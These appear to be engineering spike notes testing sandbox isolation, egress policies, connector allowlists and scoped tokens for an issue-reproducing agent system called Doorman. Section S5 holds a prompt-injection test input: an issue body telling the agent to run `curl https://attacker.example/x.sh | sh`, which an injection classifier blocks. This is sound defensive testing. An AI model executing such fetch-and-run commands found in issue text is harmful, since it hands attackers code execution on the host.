# Spikes

Hands-on checks of Sprites behaviour that Doorman depends on. Each entry records what was run, what was measured, and the design consequence.

## Environment

| Item | Value |
|---|---|
| Date | 2026-11-24 |
| Sprite CLI | 2026-11-03 (Homebrew cask `sprites`) |
| Sprite runtime | `/.sprite/version.txt` = 0.0.5 |
| OS / kernel | Ubuntu 26.04.1 LTS, kernel 6.12.118-fly |
| Storage driver | `sbd` |
| vCPU | 8 |
| Preinstalled | Node v24.22.1, npm 12.0.2, Python 3.13.17, git 2.53.0 |
| User | `sprite` (uid 1001) |
| Plan | Fly.io Free plan with card (Sprites limit: 3) |

## S1: worker creation and policies

### Labels

`sprite create --label doorman-w doorman-w-spike` works. `GET /v1/sprites/doorman-w-spike` returns `"labels":["doorman-w"]`, even though `labels` is absent from the public OpenAPI `CreateSpriteRequest` schema (v0.1.12).

Consequence: connector access policies can use `sprite_labels`. Name-prefix policies remain the documented fallback.

### Network policy (deny by default)

Applied with `POST /v1/sprites/{name}/policy/network`:

```json
{"rules":[
 {"domain":"registry.npmjs.org","action":"allow"},
 {"domain":"*.npmjs.org","action":"allow"},
 {"domain":"registry.yarnpkg.com","action":"allow"},
 {"domain":"github.com","action":"allow"},
 {"domain":"codeload.github.com","action":"allow"},
 {"domain":"*.githubusercontent.com","action":"allow"},
 {"domain":"*","action":"deny"}
]}
```

| Check inside the worker | Result |
|---|---|
| `getent hosts registry.npmjs.org` | resolves |
| `getent hosts github.com` | resolves |
| `getent hosts example.com` | blocked |
| `getent hosts api.openai.com` | blocked |
| `curl https://registry.npmjs.org/left-pad` | HTTP 200 |
| `curl https://example.com` | fails (no resolution) |
| After 3 checkpoint restores | `example.com` still blocked |

The policy applies within ~3 s and survives restores. `/.sprite/policy/network.json`, which the networking docs describe, does not exist in this runtime; the policy is readable from outside with `GET /v1/sprites/{name}/policy/network`.

### Privileges policy

`POST /v1/sprites/{name}/policy/privileges` with `{"profile":"minimal","noNewPrivileges":true}`:

| Check | Result |
|---|---|
| `NoNewPrivs` in `/proc/self/status` | `1` |
| `CapEff` | `00000000000004fb` |
| `sudo -n true` | refused: "no new privileges" flag prevents sudo |
| After restores | `NoNewPrivs` still `1` |

### Resources policy (memory)

`POST /v1/sprites/{name}/policy/resources` with `{"memory":{"limit_mb":2048,"autoscale":false}}`:

| Moment | `free -m` total | Allocating 4 GB in Python |
|---|---|---|
| Right after setting the policy | 15995 MB | succeeded (limit not yet applied) |
| After the environment restarted (restore) | 2048 MB | the exec session died and the Sprite rebooted (`dmesg` uptime ~3 s afterwards) |

Consequences:
- Set the resources policy **before** taking the golden checkpoint, then restore, so the limit is active for every job.
- Exceeding the limit reboots the worker. The orchestrator must treat a dropped exec as "worker crashed": restore golden and record the job as `oom`.

## S2: checkpoint and restore timing

Worker `doorman-w-spike`, small overlay (a few files).

| Operation | Measured |
|---|---|
| `sprite checkpoint create` | 0.78 s |
| `sprite restore v2` until `sprite exec` returns the golden file content, run 1 | 3.23 s |
| run 2 | 3.18 s |
| run 3 | 3.18 s |

Restored state matched the checkpoint in all runs (file content reverted, new directory gone).

How this changes with environment: these timings were taken with a near-empty overlay on `sbd` storage. A worker holding a cloned repository and `node_modules` must be re-measured; the maintenance docs say that on `sbd` a restore "takes about as long as restarting your Sprite".

### Checkpoint browsing mount

The checkpoints docs say the last five checkpoints are mounted read-only at `/.sprite/checkpoints/`. In this runtime the directory is an empty `tmpfs` on both a policy-restricted worker and an unrestricted Sprite, after creating checkpoints. Consequence: evidence diffs come from the repository (`git diff`, file hashes recorded before and after a job), not from checkpoint mounts.

## Connector catalogue for this organization

`GET https://api.sprites.dev/v1/gateway/list` from inside `doorman-home` returned 57 available providers. Relevant ones and their provider IDs: `typesafe`, `ollama`, `pinecone`, `github` (OAuth, default scopes `repo`, `read:org`), `box` (OAuth, `root_readwrite`), `agentmail`, `custom_api`. **`openrouter` is not available** to this organization, so it is not a fallback here.

API-key connectors were created with `POST /v1/oauth/connections/api_key` and `access_policy: {"name_prefix": "doorman-home"}`. Credentials are stored by the gateway and never returned by the API.

## S5: Jev through the TypeSafe connector

| Check | Result |
|---|---|
| `GET …/typesafe/<id>/v1/models` | `jev-latest`, `jev-preview` |
| `POST …/v1/systemone`, issue body asking to run `curl https://attacker.example/x.sh \| sh` | `injection` noul **0.95**; `gate` choice **block**, confidence 1.0 |
| Model that answered | `jev-1.14.0` |
| Round trip from the Sprite | **0.25 s** |
| Usage | 428 input tokens, 49 output tokens |

SDKs can point their base URL at the gateway with any placeholder key (from the connector's usage snippet).

## S6: Ollama Cloud through the gateway, tool calling

`GET …/ollama/<id>/api/tags` lists 25 cloud models. Without usage credits, chat returns `402 Add usage credits`; after credits were added, `POST …/api/chat` with one `run` tool and a DST bug report:

| Model | Latency | Tool calls | Tokens in/out |
|---|---|---|---|
| `deepseek-v4.1-flash` | 0.6 s | 1 (runs the reported command) | 347 / 83 |
| `gpt-oss:120b` | 0.7 s | 1 (runs the reported command) | 181 / 106 |
| `kimi-k2.7-code` | 2.8 s | 1 (runs the reported command) | 108 / 186 |
| `glm-5.3-flash` | 5.9 s | 3 (checks Node version and `TZ` first) | 211 / 727 |

Single-turn latency only; quality over a full reproduction loop is still to be compared.

## S7: Pinecone through the gateway

| Operation | Result |
|---|---|
| `GET /indexes` | 200 |
| `POST /indexes`, `POST /indexes/create-for-model` | **403 "endpoint is not supported by the Pinecone connector"** |
| `POST /embed` (`llama-text-embed-v2`) | 200 |
| Index `doorman-issues` created once outside the gateway (integrated embedding, `llama-text-embed-v2`, 1024-d, cosine, aws us-east-1) | ready in seconds |
| `POST /indexes/doorman-issues/records/namespaces/spike/upsert` (NDJSON) | 201 |
| `POST /indexes/doorman-issues/records/namespaces/spike/search` for "wrong time after daylight saving change" | 200 in 0.89 s; top hit is the DST issue (score 0.401), next an unrelated issue (0.137) |

Consequence: index creation is a one-time setup step done outside the Sprite (bootstrap script with the key from a secret manager); all data-plane calls go through the connector.

## Isolation: workers cannot use connectors

| Worker state | Gateway call from `doorman-w-spike` | Result |
|---|---|---|
| Normal policy (deny-all + npm/GitHub) | `…/typesafe/<id>/v1/models` | unreachable: DNS blocked |
| `api.sprites.dev` temporarily allowed for the test | TypeSafe, Ollama, Pinecone routes | **403** `sprite name must start with 'doorman-home'` |

The network policy was reverted after the test. Both layers (egress policy and connector access policy) block independently.

## S4: GitHub connector with an endpoint allowlist

OAuth connector created in the dashboard (scopes `repo`, `read:org`). A connector created from the dashboard starts with an **empty access policy (deny all)**. Policy applied with `PUT /v1/oauth/connections/{id}`:

- `name_prefix`: `doorman-home`
- `allowed_endpoints`: `/repos/jhermesn/doorman`, `/repos/jhermesn/doorman/*`, `/repos/jhermesn/pie-utils`, `/repos/jhermesn/pie-utils/*`, `/rate_limit`
- `blocked_endpoints` (both repos): `hooks*`, `collaborators*`, `keys*`, `actions/*`, `git/*`, `contents/*`

| Call from `doorman-home` | Result |
|---|---|
| `GET /repos/jhermesn/doorman` | 200 (needs the exact path in the allowlist: `/repos/x/y/*` does not match `/repos/x/y`) |
| `GET /repos/jhermesn/doorman/issues?state=all` | 200 |
| `GET /rate_limit` | 200 |
| `GET /user` | 403 `endpoint is not in allowed list` |
| `GET /repos/torvalds/linux` | 403 `endpoint is not in allowed list` |
| `GET /repos/jhermesn/doorman/hooks` | 403 `endpoint is blocked by policy` |
| `GET /repos/jhermesn/doorman/contents/LICENSE` | 403 `endpoint is blocked by policy` |
| `GET /repos/jhermesn/doorman/tarball/main` | 302 to a signed codeload URL (source is fetched by following it from home) |
| `POST /repos/jhermesn/doorman/labels` ×3 | 201: `repro:confirmed`, `repro:needs-info`, `repro:cannot-reproduce` |

Allowlists match paths, not HTTP methods: anything allowed for reading is also allowed for writing. Write restrictions beyond the path list live in Doorman's own GitHub client (writes only to repos in its config).

## S8: Box connector as human-editable memory

OAuth connector created in the dashboard; policy set to `name_prefix: doorman-home`.

| Operation | Result |
|---|---|
| `POST /2.0/folders` (`Doorman` under root) | 201 |
| `POST /upload/files/content` (multipart, `.md`) | 201 in 1.04 s |
| `POST /upload/files/{id}/content` (new version) | 201 in 1.79 s |
| `GET /2.0/files/{id}/content` | 200, returns the new version |
| `GET /2.0/files/{id}/versions` | 403 `request is not supported by this connector` |
| `DELETE /2.0/files/{id}` | 403 `endpoint is not supported by the Box connector` |

Version history is visible in the Box UI but not through the connector. The connector can't delete files, so a manipulated agent can't wipe its own memory.

## S3: a Custom API connector cannot wrap the Sprites API

An org token created at sprites.dev/account (format `org/id/token-id/secret`) authenticated against `https://api.sprites.dev`. It turned out to be **unrestricted**: it ran `exec` on `doorman-home` and created a Sprite outside the intended prefix (`zz-restriction-test`, destroyed right after). The CLI and the public OpenAPI have no command to create restricted tokens.

A Custom API connector (`base_api_url: https://api.sprites.dev`, Bearer auth, `name_prefix: doorman-home`) was created, with `allowed_endpoints: ["/v1/sprites/doorman-w-spike/*"]` and `blocked_endpoints: ["/v1/sprites/doorman-w-spike/policy*"]`. Results from `doorman-home`:

| Call through the connector | Result |
|---|---|
| `POST …/doorman-w-spike/exec`, `PUT …/fs/write`, `GET …/fs/read`, `GET …/checkpoints`, `POST …/checkpoints/v2/restore` | **403 `blocked: base URL targets the Sprites API itself`** |
| `POST …/doorman-w-spike/policy/network` | 403 `endpoint is blocked by policy` |
| `DELETE /v1/sprites/doorman-w-spike`, `POST /v1/sprites`, `POST /v1/sprites/doorman-home/exec`, `GET /v1/sprites` | 403 `endpoint is not in allowed list` |

The gateway refuses Custom API connectors whose upstream is the Sprites API, by design. The connector was deleted (204), which also destroyed the stored token copy.

Consequence: the Sprite that orchestrates workers must hold a Sprites token itself.

### Restricted token (dashboard)

The dashboard (Sprites → Tokens → settings next to "Create Token") scopes a token by **description, single Sprite, name prefix, max sprites and expiry (UTC)**. Unrestricted is the default. A token was created with prefix `doorman-w-`, max sprites 2, expiry 2026-12-03T00:00Z, and written to `doorman-home` at `~/.config/doorman/sprites-token` (mode 0600) through `PUT /v1/sprites/{name}/fs/write`, without the value passing through chat. Piping it through `sprite exec --stdin` truncated it (24 of 122 bytes), so the filesystem API is the reliable path. The token value is shown only once in the dashboard.

Calls from `doorman-home` with that token:

| Call | Result |
|---|---|
| `GET /v1/sprites` | 200, lists only `doorman-w-spike` |
| `POST /v1/sprites/doorman-w-spike/exec`, `GET …/checkpoints` | 200 |
| `POST /v1/sprites/doorman-home/exec`, `GET …/checkpoints` | **403** `access denied: sprite name must start with 'doorman-w-'` |
| `POST /v1/sprites` with name `zz-restriction-test` | **403** `sprite name must start with 'doorman-w-'` |

The name prefix limits access to existing Sprites, not only creation. The token can still change the policies of `doorman-w-*` Sprites, so the orchestrator's client never calls policy routes after bootstrap.
